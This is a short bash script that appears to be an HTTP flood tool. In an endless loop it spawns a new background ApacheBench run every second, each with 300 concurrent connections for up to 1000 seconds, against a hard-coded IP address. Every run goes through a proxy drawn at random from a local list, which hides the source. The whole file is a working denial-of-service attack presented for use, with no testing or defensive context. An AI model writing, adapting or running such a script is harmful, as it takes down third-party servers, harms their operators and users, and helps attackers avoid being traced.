#!/bin/bash
while true;do
ab -c 300 -n 5 -t 1000 -X $(shuf -n1 /root/ip.txt) http://81.70.18.208/ &
sleep 1
done